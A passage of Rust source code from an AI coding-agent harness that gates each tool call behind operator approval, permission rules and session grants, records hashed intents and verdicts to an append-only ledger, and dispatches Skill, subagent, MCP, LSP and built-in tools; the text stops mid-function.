//! Tool-call approval, ledger evidence, pure execution (DR-19, DR-20 §2.6/§2.7).
//!
//! Execution ordering is fail-closed:
//!   ToolIntent append+fsync -> approval verdict append+fsync -> pure executor
//!   -> ToolResult append+fsync.
//! The ledger receives only hashes/sizes; never raw arguments or result bytes.
//!
//! Approval is behind an `ApprovalChannel` trait (DR-20 §2.6):
//! - `StdApprovalChannel` wraps the existing blocking stdin reader (REPL).
//! - `TuiApprovalChannel` (in hud-tui) posts to the bus and parks on a response.
//! - The `R` verdict (DR-20 §2.7) grants session-scoped per-tool auto-approval.

use orbit_ledger::LedgerWriter;
use orbit_ledger::event::{LedgerEvent, ToolIntent, ToolResult, ToolVerdict};
use sha2::{Digest, Sha256};
use std::path::Path;

const MAX_ARGUMENT_BYTES: usize = 64 * 1024;
const MAX_RESULT_BYTES: usize = 64 * 1024;

/// The operator's verdict on a pending tool call (DR-20 §2.7).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ApprovalVerdict {
    /// Allow this one call.
    AllowOnce,
    /// Deny this call.
    Deny,
    /// Always-allow this tool for the rest of the session (session-scoped,
    /// per-tool-name, ledger-logged, revocable). Does NOT bypass `is_known_tool`.
    /// The whole tool: kept as `R` for one release beside the narrower
    /// grants below.
    AllowSession,
    /// `s`: allow the calls that match the rule the card offered
    /// (`Bash(cargo test *)`), for this session.
    AllowRuleSession,
    /// `a`: the same rule, and remember it in this folder's local settings
    /// so later sessions need not ask.
    AllowRuleAlways,
}

thread_local! {
    /// True when the front-end is a plain surface (REPL / non-TTY) and
    /// stdout lines are safe. The TUI leaves it false — its worker threads
    /// must never print to the alt screen.
    static PLAIN_OUTPUT: std::cell::Cell<bool> = const { std::cell::Cell::new(false) };
}

/// Enable plain-grammar stdout lines (REPL / non-TTY front-ends).
pub fn enable_plain_output() {
    PLAIN_OUTPUT.with(|c| c.set(true));
}

fn plain_output_enabled() -> bool {
    PLAIN_OUTPUT.with(|c| c.get())
}

/// Current wall-clock time as HH:MM for the plain grammar's line stamps.
fn hhmm_now() -> String {
    let secs = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    let (h, m) = ((secs / 3600) % 24, (secs / 60) % 60);
    format!("{h:02}:{m:02}")
}

/// The rule the card offers to remember for a call: not the whole tool
/// (`R`), but this kind of call. Derived from the call by the backend, so
/// the card shows exactly what `s` and `a` would grant (design law 6).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct GrantOffer {
    /// The rule as it is written in a settings file: `Bash(cargo test *)`.
    pub rule: String,
    /// The tool the rule is about, and its pattern: `Bash`, `cargo test *`.
    pub tool: String,
    pub pattern: String,
    /// Whether `a` can save it: the folder is trusted, so its local
    /// settings are read back.
    pub can_save: bool,
}

/// A pending tool call awaiting approval — the data the channel sees.
#[derive(Debug, Clone)]
pub struct ApprovalRequest {
    /// Used by `TuiApprovalChannel` to correlate the modal with the call.
    #[allow(dead_code)] // wired in PR-D (TUI approval modal)
    pub call_id: String,
    /// Used by `TuiApprovalChannel` to check R-grants per tool.
    #[allow(dead_code)] // wired in PR-D (TUI approval modal)
    pub tool_name: String,
    pub summary: String,
    /// Structured risk classification (backend-authoritative; the UI renders
    /// it, never infers it). §6.15: the risk badge lives here so the
    /// approval card can draw ▰▰▱ without classifying on its own.
    pub risk: crate::tools::RiskLevel,
    /// The lines the call would change, for the card (an Edit's removed
    /// and added lines) — from the call's own arguments.
    pub preview: Vec<String>,
    /// What `s` and `a` would remember, when there is something narrower
    /// than the whole tool to offer.
    pub grant: Option<GrantOffer>,
}

/// Approval channel — how the operator is asked to approve a tool call.
/// The default impl (`StdApprovalChannel`) wraps the existing stdin reader;
/// the TUI provides its own that posts to the event bus.
pub trait ApprovalChannel: Send {
    /// Ask the operator to approve a tool call. Returns the verdict.
    /// The `auto_tools` flag is true when `--auto-tools` was granted up front
    /// (in which case the channel may skip the prompt and return `AllowOnce`).
    fn ask(&mut self, req: &ApprovalRequest, auto_tools: bool) -> ApprovalVerdict;

    /// The note typed with a denial ("use `make test` instead"), taken
    /// once after `ask` returned `Deny`. It goes to the model as the
    /// reason; it is never written to the ledger.
    fn take_note(&mut self) -> Option<String> {
        None
    }
}

/// The standard stdin-based approval channel, optionally sharing cancellation
/// with the plain frontend's command reader and current operation.
pub struct StdApprovalChannel {
    interactive: bool,
    note: Option<String>,
    cancel: Option<orbit_provider_http::CancelToken>,
    input_failed: bool,
}

impl StdApprovalChannel {
    pub fn new(interactive: bool) -> Self {
        Self {
            interactive,
            note: None,
            cancel: None,
            input_failed: false,
        }
    }

    pub fn with_cancel(interactive: bool, cancel: orbit_provider_http::CancelToken) -> Self {
        Self {
            cancel: Some(cancel),
            ..Self::new(interactive)
        }
    }

    /// A failed input boundary ends its owning plain command after persistence.
    pub fn input_failed(&self) -> bool {
        self.input_failed
    }

    fn cancelled(&self) -> bool {
        self.cancel
            .as_ref()
            .is_some_and(|cancel| cancel.is_cancelled())
    }

    fn fail_input(&mut self) {
        self.input_failed = true;
        self.note = None;
        if let Some(cancel) = &self.cancel {
            cancel.cancel();
        }
    }

    fn verdict_for_line(&mut self, req: &ApprovalRequest, line: &str) -> ApprovalVerdict {
        self.note = None;
        if self.cancelled() {
            return ApprovalVerdict::Deny;
        }
        let answer = line.trim().to_ascii_lowercase();
        match answer.as_str() {
            "y" | "yes" => ApprovalVerdict::AllowOnce,
            "s" if req.grant.is_some() => ApprovalVerdict::AllowRuleSession,
            "a" if req.grant.is_some() => ApprovalVerdict::AllowRuleAlways,
            _ => {
                // `n use make instead`: the note reaches the model, not the ledger.
                self.note = line
                    .trim()
                    .strip_prefix(['n', 'N'])
                    .map(str::trim)
                    .filter(|note| !note.is_empty())
                    .map(str::to_string);
                ApprovalVerdict::Deny
            }
        }
    }
}

impl ApprovalChannel for StdApprovalChannel {
    fn take_note(&mut self) -> Option<String> {
        self.note.take()
    }

    fn ask(&mut self, req: &ApprovalRequest, auto_tools: bool) -> ApprovalVerdict {
        self.note = None;
        if self.cancelled() {
            return ApprovalVerdict::Deny;
        }
        if auto_tools {
            return ApprovalVerdict::AllowOnce;
        }
        if !self.interactive {
            return ApprovalVerdict::Deny;
        }
        // Plain grammar (§11.4): words not glyphs, risk in words, the
        // choices spelled out. Same grammar as the TUI's copy mode.
        use std::io::Write;
        let rules = match &req.grant {
            Some(g) if g.can_save => {
                format!(
                    "s allow {} this session, a always allow {}, ",
                    g.rule, g.rule
                )
            }
            Some(g) => format!("s allow {} this session, ", g.rule),
            None => String::new(),
        };
        print!(
            "approval needed: {} ({} risk). y allow once, {rules}n deny: ",
            req.summary,
            req.risk.as_str(),
        );
        let _ = std::io::stdout().flush();
        let line = if let Some(cancel) = &self.cancel {
            match crate::plain_input::read_stdin_line(cancel) {
                Ok(crate::plain_input::PlainInput::Line(line)) => line,
                Ok(
                    crate::plain_input::PlainInput::Eof | crate::plain_input::PlainInput::Cancelled,
                ) => return ApprovalVerdict::Deny,
                Err(error) => {
                    self.fail_input();
                    eprintln!("approval input failed: {error}");
                    return ApprovalVerdict::Deny;
                }
            }
        } else {
            let mut line = String::new();
            if std::io::stdin().read_line(&mut line).is_err() {
                return ApprovalVerdict::Deny;
            }
            line
        };
        self.verdict_for_line(req, &line)
    }
}

/// A session-scoped set of tools that have been whole-tool granted (the
/// web/Go "session" verdict; the interactive card no longer offers one —
/// `s`/`a` remember a rule instead). Stored in the harness; checked
/// before calling `approval.ask`.
#[derive(Debug, Clone, Default)]
pub struct AutoGrants {
    tools: std::collections::HashSet<String>,
    /// Allow rules granted with `s` or `a` this session: this kind of
    /// call, not the whole tool. Read like a settings rule, so a Bash rule
    /// never covers a chained line.
    rules: Vec<orbit_tools::permissions::PermissionRule>,
}

/// The session's permission scope (S5): the mode and the operator's
/// explicit allow/disallow lists, owned by the session and passed
/// explicitly — never process-wide environment variables, which are
/// not thread-safe (subagents run nested turns), can't change at
/// runtime, and leak into every Bash child.
#[derive(Debug, Clone, Default)]
pub struct PermissionScope {
    /// `--permission-mode` (default, acceptEdits, plan, dontAsk, bypass).
    pub mode: orbit_tools::permissions::PermissionMode,
    /// `--allowedTools`: an explicit scope — only what it names may run.
    pub allowlist: Option<Vec<String>>,
    /// `--disallowedTools`: deny rules on top of the scope.
    pub disallowlist: Vec<String>,
}

impl PermissionScope {
    /// Build from the CLI flags (`--permission-mode`, `--allowedTools`,
    /// `--disallowedTools`), comma-separated as on the command line.
    pub fn from_flags(mode: Option<&str>, allow: Option<&str>, deny: Option<&str>) -> Self {
        let mode = mode
            .and_then(orbit_tools::permissions::PermissionMode::from_config)
            .unwrap_or_default();
        let allowlist = allow.map(|l| {
            l.split(',')
                .map(str::trim)
                .filter(|s| !s.is_empty())
                .map(String::from)
                .collect::<Vec<_>>()
        });
        let disallowlist = deny
            .map(|l| {
                l.split(',')
                    .map(str::trim)
                    .filter(|s| !s.is_empty())
                    .map(String::from)
                    .collect::<Vec<_>>()
            })
            .unwrap_or_default();
        Self {
            mode,
            allowlist,
            disallowlist,
        }
    }
}

impl AutoGrants {
    pub fn new() -> Self {
        Self::default()
    }

    /// True if this tool name has been R-granted.
    pub fn is_granted(&self, tool_name: &str) -> bool {
        self.tools.contains(tool_name)
    }

    /// Grant always-allow for this tool (session-scoped).
    pub fn grant(&mut self, tool_name: &str) {
        self.tools.insert(tool_name.to_string());
    }

    /// Grant a rule for the rest of the session: `Bash` / `cargo test *`.
    pub fn grant_rule(&mut self, tool: &str, pattern: &str) {
        let rule = orbit_tools::permissions::PermissionRule {
            tool: tool.to_string(),
            pattern: pattern.to_string(),
            effect: orbit_tools::permissions::RuleEffectSerde::Allow,
        };
        if !self.rules.contains(&rule) {
            self.rules.push(rule);
        }
    }

    /// Does a rule granted this session cover this call's key?
    pub fn rule_granted(&self, tool: &str, argument: &str) -> bool {
        self.rules
            .iter()
            .any(|r| r.tool == tool && orbit_tools::permissions::rule_matches(r, argument))
    }

    /// Revoke the R-grant for this tool (e.g. operator pressed `n`).
    pub fn revoke(&mut self, tool_name: &str) {
        self.tools.remove(tool_name);
    }

    /// Revoke all grants (e.g. `/revoke` command).
    #[allow(dead_code)] // wired to `/revoke` and the TUI status control in PR-D
    pub fn revoke_all(&mut self) {
        self.tools.clear();
        self.rules.clear();
    }

    /// List currently granted tool names (for the status bar display).
    #[allow(dead_code)] // wired to the TUI status bar in PR-D
    pub fn granted_tools(&self) -> Vec<&str> {
        self.tools.iter().map(String::as_str).collect()
    }
}

/// Execute one pending call with approval + ledger evidence.
///
/// A real file change from a checkpointed write (M11): true counts and
/// bounded hunks for the Changes panel — computed from the
/// checkpoint's before/after bytes, never invented.
pub struct FileChange {
    pub path: String,
    pub added: u32,
    pub removed: u32,
    pub checkpoint_id: String,
    pub hunks: Option<Vec<orbit_frontend_protocol::DiffHunk>>,
}

/// The `approval` channel is injected — `StdApprovalChannel` for the REPL,
/// `TuiApprovalChannel` for the TUI. The `grants` set tracks session-scoped
/// R-grants so previously-approved tools skip the prompt.
///
/// Returns the tool's payload plus, when the call was a successful
/// checkpointed write, the real file change (M11): true counts and
/// bounded hunks computed from the checkpoint's before/after bytes.
#[allow(clippy::too_many_arguments)]
pub fn execute_call(
    home: &Path,
    session_id: &str,
    decision_id: &str,
    call: &crate::PendingToolCall,
    auto_tools: bool,
    interactive: bool,
    approval: &mut dyn ApprovalChannel,
    grants: &mut AutoGrants,
    // The SESSION's permission scope (S5): mode + operator lists,
    // owned by the caller and passed explicitly — env vars are gone.
    scope: &PermissionScope,
    // The SESSION's tool context (B2): cloned per call, but the clone
    // shares the read-before-edit map, so Read's record survives to
    // Edit. Callers build this once per session.
    tool_cx: &orbit_tools::ToolContext,
) -> Result<(String, Option<FileChange>), String> {
    if call.arguments.len() > MAX_ARGUMENT_BYTES {
        return Ok((tool_error("tool arguments exceed 64 KiB"), None));
    }
    let arguments_sha256 = hex::encode(Sha256::digest(&call.arguments));
    // The retry here (not just in record_result) is what makes a
    // parallel wave safe: several calls open the writer for their
    // intent at once, and the loser must wait out the winner, not
    // fail the call.
    let mut writer = reopen_writer(home)?;
    let intent_digest = writer
        .append(LedgerEvent::ToolIntent(ToolIntent {
            session_id: session_id.into(),
            decision_id: decision_id.into(),
            call_id: call.id.clone(),
            tool_name: call.name.clone(),
            arguments_sha256,
            arguments_bytes: call.arguments.len() as u64,
        }))
        .map_err(|e| format!("record tool intent: {e}"))?;
    tool_cx.note_ledger(orbit_tools::LedgerNote {
        kind: "intent",
        target: safe_call_summary(call),
        fact: "requested".to_string(),
        digest: intent_digest,
    });
    // LedgerWriter::append is the durability boundary (append+fsync), so no
    // execution may happen before the call returns successfully.

    let known = crate::tools::is_known_tool(&call.name);

    // B4: layer 2's pattern verdict, computed once here so headless
    // runs don't blanket-deny calls the mode/rules allow. The channel
    // is only asked when BOTH layers say ask.
    let args_preview =
        crate::tools::parse_arguments(&call.arguments).unwrap_or(serde_json::Value::Null);
    let asset_policy = if call.name == "Read" {
        args_preview
            .get("file_path")
            .and_then(|value| value.as_str())
            .map(|path| crate::plugin_content::asset_policy_path(tool_cx, path))
            .transpose()
    } else {
        Ok(None)
    };
    let asset_args = if let Ok(Some(Some(path))) = &asset_policy {
        let mut alias = args_preview.clone();
        alias["file_path"] = path.to_string_lossy().into_owned().into();
        Some(alias)
    } else {
        None
    };
    let asset_scope = asset_args
        .as_ref()
        .map(|alias| asset_read_scope(scope, &args_preview, alias));
    let policy_scope = asset_scope
        .as_ref()
        .and_then(|scope| scope.as_ref().ok())
        .unwrap_or(scope);
    let mcp_plan = call
        .name
        .starts_with("mcp__")
        .then(|| capture_mcp_dispatch_plan(home, &call.name, tool_cx));
    let mut pattern_verdict = match &mcp_plan {
        Some(Ok(plan)) => pattern_layer_verdict_with_plan(
            home,
            policy_scope,
            &call.name,
            &args_preview,
            &tool_cx.working_dir,
            Some(plan),
        ),
        Some(Err(error)) => {
            let (safe, redactions) = scan_mcp_text(error);
            PatternOutcome::McpError(safe, redactions)
        }
        None => pattern_layer_verdict_in(
            home,
            policy_scope,
            &call.name,
            &args_preview,
            &tool_cx.working_dir,
        ),
    };
    if let Some(alias) = &asset_args {
        pattern_verdict = combine_pattern_outcomes(
            pattern_verdict,
            pattern_layer_verdict_in(home, policy_scope, &call.name, alias, &tool_cx.working_dir),
        );
    }
    if let Some(Err(error)) = asset_scope {
        pattern_verdict = PatternOutcome::Deny(error);
    }
    if call.name.starts_with("mcp__")
        && tool_cx
            .ext::<McpToolSelection>()
            .is_some_and(|selection| !selection.0.contains(&call.name))
    {
        pattern_verdict =
            PatternOutcome::Deny("MCP tool is outside the agent's tool selection".into());
    }
    if call.name == "LspDiagnostics"
        && tool_cx
            .ext::<LspToolSelection>()
            .is_some_and(|allowed| !allowed.0)
    {
        pattern_verdict =
            PatternOutcome::Deny("diagnostics are outside the agent's tool selection".into());
    }
    if let Err(error) = asset_policy {
        pattern_verdict = PatternOutcome::Deny(error);
    }
    if !crate::plugin_content::permits_alias(
        tool_cx,
        &call.name,
        &args_preview,
        asset_args.as_ref(),
        mcp_plan
            .as_ref()
            .and_then(|plan| plan.as_ref().ok())
            .map(|plan| plan.server.as_str()),
    ) {
        pattern_verdict =
            PatternOutcome::Deny("tool is outside the invocation's inherited tool ceiling".into());
    }
    if crate::tools::bare_mode() && matches!(call.name.as_str(), "Skill" | "Task" | "Agent") {
        pattern_verdict =
            PatternOutcome::Deny("content invocation is unavailable in bare mode".into());
    }

    // Determine the verdict:
    // 1. Unknown tool → always deny (fail-closed, even with --auto-tools / R).
    // 2. Persistent deny rule → deny, no prompt.
    // 3. A deny rule or plan mode in the pattern layer → deny. No consent
    //    and no grant outranks it: this check comes BEFORE them, so the
    //    ledger records a refusal as a refusal (the tool layer would have
    //    refused it anyway).
    // 4. Persistent allow rule → allow once, no prompt (durable R-grant).
    // 5. --auto-tools → allow once (up-front consent for pure built-ins).
    // 6. Session grant (the whole tool with R, or a rule with s / a)
    //    → allow once.
    // 7. Otherwise → ask the approval channel.
    // Unknown tools always deny (fail-closed, even with --auto-tools / R).
    // Persistent rules (permissions.toml) sit between unknown-tool denial
    // and everything else — deny rules are a durable fail-closed, allow
    // rules a durable consent. A malformed rules file degrades to ask
    // (never silently allow).
    let rule_verdict = match &mcp_plan {
        Some(Ok(plan)) => plan.legacy_verdict(&call.name),
        _ => crate::permissions::PermissionRules::load(home)
            .unwrap_or_default()
            .verdict(&call.name),
    };
    // The call's permission key, for rules granted this session.
    // Task/Agent are intercepted below (not registry tools), but their
    // pattern rules and session grants key on Agent(<agent-type>) —
    // the same key the deleted registry AgentTool computed.
    let call_key = if call.name == "Task" || call.name == "Agent" {
        Some(orbit_tools::agent_permission_key(&args_preview))
    } else {
        orbit_tools::registry()
            .into_iter()
            .find(|t| t.name() == call.name)
            .map(|t| t.permission_key(&args_preview))
    };
    let rule_granted = call_key
        .as_ref()
        .is_some_and(|k| grants.rule_granted(&k.tool, &k.pattern));
    let mut offer: Option<GrantOffer> = None;
    let mut verdict = if !known || rule_verdict == crate::permissions::RuleVerdict::Deny {
        ApprovalVerdict::Deny
    } else if matches!(
        pattern_verdict,
        PatternOutcome::Deny(_) | PatternOutcome::McpError(_, _)
    ) {
        // A pattern deny rule (or plan mode refusing a write) is final.
        ApprovalVerdict::Deny
    } else if pattern_verdict != PatternOutcome::ExplicitAsk
        && (rule_verdict == crate::permissions::RuleVerdict::Allow
        || auto_tools
        || grants.is_granted(&call.name)
        || rule_granted
        // B4: the mode/pattern layer allows it outright (read-only in
        // default mode, edits in acceptEdits, an allow rule from
        // --allowedTools or settings.toml).
        || pattern_verdict == PatternOutcome::Allow)
    {
        ApprovalVerdict::AllowOnce
    } else {
        // E9: PermissionRequest fires when the operator is asked to
        // decide (hooks can observe, not replace, the ask).
        let hooks_pr = orbit_engine::hooks::Hooks::load(home, project_trusted_home(home));
        let _ = hooks_pr.fire(
            orbit_engine::hooks::HookEvent::PermissionRequest,
            &serde_json::json!({
                "tool": call.name,
                "summary": safe_call_summary(call),
            }),
        );
        offer = grant_offer(home, scope, &tool_cx.working_dir, &call.name, &args_preview);
        approval.ask(
            &ApprovalRequest {
                call_id: call.id.clone(),
                tool_name: call.name.clone(),
                summary: safe_call_summary(call),
                risk: crate::tools::call_risk(&call.name, &args_preview),
                preview: crate::tools::approval_preview(&call.name, &args_preview),
                grant: offer.clone(),
            },
            auto_tools && pattern_verdict != PatternOutcome::ExplicitAsk,
        )
    };
    // Consent names the captured server/configuration/policy, never a fresh
    // decode of an alias. Refuse changes before recording an allowed verdict.
    let mcp_changed = verdict != ApprovalVerdict::Deny
        && mcp_plan
            .as_ref()
            .and_then(|plan| plan.as_ref().ok())
            .is_some_and(|plan| !mcp_plan_is_current(home, &call.name, tool_cx, plan));
    if mcp_changed {
        verdict = ApprovalVerdict::Deny;
    }

    // Apply the grant's side effects. `s` and `a` remember the rule the
    // card offered (nothing, if none was: the key did not mean anything);
    // `a` also writes it to the folder's local settings, and if that
    // cannot be done the rule is still good for this session and the
    // record says so.
    let mut saved: Option<bool> = None;
    let allowed = match verdict {
        ApprovalVerdict::AllowOnce => true,
        ApprovalVerdict::AllowSession => {
            grants.grant(&call.name);
            true
        }
        ApprovalVerdict::AllowRuleSession | ApprovalVerdict::AllowRuleAlways => {
            if let Some(o) = &offer {
                grants.grant_rule(&o.tool, &o.pattern);
                if verdict == ApprovalVerdict::AllowRuleAlways {
                    saved = Some(o.can_save && save_rule(&tool_cx.working_dir, &o.rule).is_ok());
                }
            }
            true
        }
        ApprovalVerdict::Deny => {
            // Pressing `n` on a previously-R-granted tool revokes the grant.
            grants.revoke(&call.name);
            false
        }
    };
    // The note typed with a denial: the model's reason, not the ledger's.
    let note = if allowed {
        None
    } else {
        approval.take_note().filter(|n| !n.trim().is_empty())
    };

    let reason = if mcp_changed {
        "MCP configuration or policy changed after approval; request confirmation again"
    } else if !known {
        "unknown tool (deny-by-default)"
    } else if rule_verdict == crate::permissions::RuleVerdict::Deny {
        "denied by persistent rule (permissions.toml)"
    } else if let PatternOutcome::Deny(r) = &pattern_verdict {
        // B4: the mode/pattern layer denied (a deny rule, or plan mode
        // refusing a write) — its reason is the honest one.
        r
    } else if let PatternOutcome::McpError(error, _) = &pattern_verdict {
        error
    } else if pattern_verdict == PatternOutcome::ExplicitAsk {
        if allowed {
            "operator approved configured explicit confirmation"
        } else if !interactive {
            "configured explicit confirmation requires an interactive approval"
        } else {
            "operator declined configured explicit confirmation"
        }
    } else if rule_verdict == crate::permissions::RuleVerdict::Allow {
        "allowed by persistent rule (permissions.toml)"
    } else if auto_tools {
        "allowed by --auto-tools up-front consent"
    } else if grants.is_granted(&call.name) && !matches!(verdict, ApprovalVerdict::Deny) {
        "allowed by session R-grant"
    } else if rule_granted {
        "allowed by a rule granted this session"
    } else if !interactive && !auto_tools {
        // B4: headless is not an error — the call needs one of the
        // headless allow paths (--auto-tools, a rule, --allowedTools)
        // and the denial says so.
        "non-interactive tool call requires --auto-tools or an allow rule (--allowedTools / settings.toml)"
    } else if verdict == ApprovalVerdict::AllowRuleSession {
        "operator approved: rule granted for this session"
    } else if verdict == ApprovalVerdict::AllowRuleAlways {
        match saved {
            Some(true) => "operator approved: rule saved to local settings",
            _ => "operator approved: rule granted for this session (could not be saved)",
        }
    } else if allowed {
        "operator approved"
    } else if note.is_some() {
        "operator denied (with a note)"
    } else {
        "operator denied"
    };
    let verdict_digest = writer
        .append(LedgerEvent::ToolVerdict(ToolVerdict {
            session_id: session_id.into(),
            decision_id: decision_id.into(),
            call_id: call.id.clone(),
            tool_name: call.name.clone(),
            allowed,
            reason: reason.into(),
        }))
        .map_err(|e| format!("record tool verdict: {e}"))?;
    tool_cx.note_ledger(orbit_tools::LedgerNote {
        kind: "verdict",
        target: safe_call_summary(call),
        fact: format!("{} — {reason}", if allowed { "allowed" } else { "denied" }),
        digest: verdict_digest,
    });

    // Plain grammar (§11.4): the verdict is one stamped line on stdout —
    // words not glyphs, greppable, screen-reader friendly. Only in plain
    // mode: the TUI worker shares this code path, and a println from it
    // would scribble on the alternate screen.
    if plain_output_enabled() {
        println!(
            "{} tool {} {}: {}",
            hhmm_now(),
            call.name,
            safe_call_summary(call),
            if allowed {
                "allowed by you"
            } else {
                "denied by you"
            }
        );
    }

    // Release the ledger's single-writer lock BEFORE execution: a
    // nested session (the Task tool spawning a subagent, phase 5) opens
    // its own writer for the subagent's calls, and holding this lock
    // across the dispatch deadlocked the subagent at boot (E0719). The
    // verdict is durably recorded above; the result reopens below.
    drop(writer);

    if !allowed {
        let mut output = match &note {
            Some(n) => tool_denial(&format!("denied by the operator: {n}")),
            None => tool_denial(reason),
        };
        if let PatternOutcome::McpError(_, redactions) = &pattern_verdict {
            let mut envelope: serde_json::Value = serde_json::from_str(&output).unwrap_or_default();
            envelope["redactions"] = (*redactions).into();
            output = envelope.to_string();
        }
        // D9: a denial is not an error — audits must be able to tell an
        // operator refusal apart from a tool that ran and failed.
        record_result(
            home,
            session_id,
            decision_id,
            call,
            "denied",
            &output,
            tool_cx,
        )?;
        return Ok((output, None));
    }

    let args = match crate::tools::parse_arguments(&call.arguments) {
        Ok(v) => v,
        Err(e) => {
            let output = tool_error(&e);
            record_result(
                home,
                session_id,
                decision_id,
                call,
                "error",
                &output,
                tool_cx,
            )?;
            return Ok((output, None));
        }
    };

    // The Skill tool (phase 5): load a body on demand.
    if call.name == "Skill" {
        let response = match args.get("name").and_then(|v| v.as_str()) {
            Some(name) => match crate::plugin_content::invoke_skill(
                tool_cx,
                session_id,
                name,
                &args,
                crate::plugin_content::InvocationOrigin::Model,
                scope,
                approval,
            ) {
                Ok(v) if v.get("ok").and_then(serde_json::Value::as_bool) == Some(false) => v,
                Ok(v) => serde_json::json!({ "ok": true, "result": v }),
                Err(e) => serde_json::json!({"ok":false,"error":e}),
            },
            None => serde_json::json!({"ok":false,"error":"Skill requires 'name'"}),
        };
        let output = skill_result_output(response);
        let status = if orbit_tools::result_is_denial(&output) {
            "denied"
        } else if orbit_tools::result_is_error(&output) {
            "error"
        } else {
            "ok"
        };
        record_result(
            home,
            session_id,
            decision_id,
            call,
            status,
            &output,
            tool_cx,
        )?;
        return Ok((output, None));
    }

    // Agent controls share the normal ledger and permission path above.
    if call.name == "ListAgents" || call.name == "AgentSendMessage" {
        let result = agent_store_for_context(home, session_id, tool_cx).and_then(|store| {
            if call.name == "ListAgents" {
                let offset = args
                    .get("offset")
                    .map(|value| {
                        value
                            .as_u64()
                            .and_then(|n| usize::try_from(n).ok())
                            .ok_or("ListAgents 'offset' must be a non-negative integer")
                    })
                    .transpose()?
                    .unwrap_or(0);
                let limit = args
                    .get("limit")
                    .map(|value| {
                        value
                            .as_u64()
                            .filter(|n| (1..=64).contains(n))
                            .ok_or("ListAgents 'limit' must be between 1 and 64")
                    })
                    .transpose()?
                    .unwrap_or(20) as usize;
                store.list().map(|agents| {
                    let total = agents.len();
                    let mut agents: Vec<_> = agents.into_iter().skip(offset).take(limit).collect();
                    // The store bounds agent counts and fields; the wire also
                    // respects the common tool-result bound for large metadata.
                    while serde_json::to_vec(&agents)
                        .map_or(true, |body| body.len() > MAX_RESULT_BYTES - 1024)
                    {
                        if agents.pop().is_none() {
                            break;
                        }
                    }
                    let next = offset.saturating_add(agents.len());
                    serde_json::json!({
                        "total": total, "offset": offset,
                        "next_offset": (next < total).then_some(next), "agents": agents,
                    })
                })
            } else {
                let id = args
                    .get("agent_id")
                    .and_then(|v| v.as_str())
                    .ok_or("AgentSendMessage requires 'agent_id'")?;
                let text = args
                    .get("message")
                    .and_then(|v| v.as_str())
                    .ok_or("AgentSendMessage requires 'message'")?;
                let identity = agent_session_context(tool_cx, session_id);
                store
                    .enqueue(id, text, identity.current_agent_id.as_deref())
                    .map(|message| {
                        serde_json::json!({
                            "agent_id": id,
                            "message_id": message.message_id,
                            "status": "queued",
                            "delivery": "next explicit Task resume"
                        })
                    })
            }
        });
        let output = match result {
            Ok(v) => serde_json::json!({ "ok": true, "result": v }).to_string(),
            Err(e) => tool_error(&e),
        };
        let status = if orbit_tools::result_is_error(&output) {
            "error"
        } else {
            "ok"
        };
        record_result(
            home,
            session_id,
            decision_id,
            call,
            status,
            &output,
            tool_cx,
        )?;
        return Ok((output, None));
    }

    // The Task tool (phase 5) and its Agent alias: spawn a subagent.
    // The subagent needs the session's TurnConfig — derived from the
    // same environment the front-ends use, so provider/gate/model
    // match the parent. `Agent` is the current Claude Code name; both
    // shapes route to the one runner.
    if call.name == "Task" || call.name == "Agent" {
        let observer = tool_cx.ext::<SubagentObserver>();
        let response = match crate::tools::execute_task_in_session(
            home,
            session_id,
            &args,
            tool_cx,
            scope,
            approval,
            observer.as_deref().map(|o| &*o.0),
        ) {
            Ok(v) if v.get("ok").and_then(|ok| ok.as_bool()) == Some(false) => serde_json::json!({
                "ok": false,
                "agent_id": v.get("agent_id"),
                "error": if v.get("status").and_then(|s| s.as_str()) == Some("cancelled") {
                    "agent cancelled"
                } else { "agent stopped before completing" },
                "result": v,
            }),
            Ok(v) => serde_json::json!({ "ok": true, "result": v }),
            Err(e) => e.into_value(),
        };
        let output = bounded_task_output(response);
        let status = if orbit_tools::result_is_denial(&output) {
            "denied"
        } else if orbit_tools::result_is_error(&output) {
            "error"
        } else {
            "ok"
        };
        record_result(
            home,
            session_id,
            decision_id,
            call,
            status,
            &output,
            tool_cx,
        )?;
        return Ok((output, None));
    }

    // MCP tools (phase 5): mcp__<server>__<tool> — spawn, call, scan.
    if call.name.starts_with("mcp__") {
        let output = match &mcp_plan {
            Some(Ok(plan)) => execute_mcp(home, call, &args, tool_cx, plan),
            _ => tool_denial("MCP dispatch has no validated captured plan"),
        };
        let status = if orbit_tools::result_is_denial(&output) {
            "denied"
        } else if orbit_tools::result_is_error(&output) {
            "error"
        } else {
            "ok"
        };
        record_result(
            home,
            session_id,
            decision_id,
            call,
            status,
            &output,
            tool_cx,
        )?;
        return Ok((output, None));
    }

    if call.name == "LspDiagnostics" {
        let result = serde_json::from_value::<crate::lsp::LspDiagnosticsArgs>(args.clone())
            .map_err(|error| crate::lsp::LspError::Configuration(error.to_string()))
            .and_then(|arguments| crate::lsp::diagnostics(home, tool_cx, scope, &arguments));
        let (output, status) = lsp_result_output(result);
        record_result(
            home,
            session_id,
            decision_id,
            call,
            status,
            &output,
            tool_cx,
        )?;
        return Ok((output, None));
    }

    // Wave 1 tools (Read/Write/Edit/Glob/Grep/Bash/TaskStop) run
    // through the orbit-tools registry: the real implementations, the
    // permission layer (modes + pattern rules), the deny-read list and
    // the secret scanner on every result (review blocker 1).
    if orbit_tools::is_wave1(&call.name) {
        let (output, file_change) = execute_wave1(home, scope, call, &args, tool_cx);
        let status = if orbit_tools::result_is_denial(&output) {
            "denied"
        } else if orbit_tools::result_is_error(&output) {
            "error"
        } else {
            "ok"
        };
        // E9: PostToolUseFailure fires for the error path (the plain
        // PostToolUse fires inside execute_wave1 with ok=true/false).
        // A denial (status "denied") is not a failure — the tool never
        // ran (D9), and PermissionRequest already covered the moment.
        if status == "error" {
            let hooks = orbit_engine::hooks::Hooks::load(home, project_trusted_home(home));
            let _ = hooks.fire(
                orbit_engine::hooks::HookEvent::PostToolUseFailure,
                &serde_json::json!({ "tool": call.name, "ok": false }),
            );
        }
        record_result(
            home,
            session_id,
            decision_id,
            call,
            status,
            &output,
            tool_cx,
        )?;
        return Ok((output, file_change));
    }

    let result = crate::tools::execute(&call.name, &args);
    let output = match result {
        Ok(v) => serde_json::json!({ "ok": true, "result": v }).to_string(),
        Err(e) => tool_error(&e),
    };
    if output.len() > MAX_RESULT_BYTES {
        let truncated = tool_error("tool result exceeds 64 KiB");
        record_result(
            home,
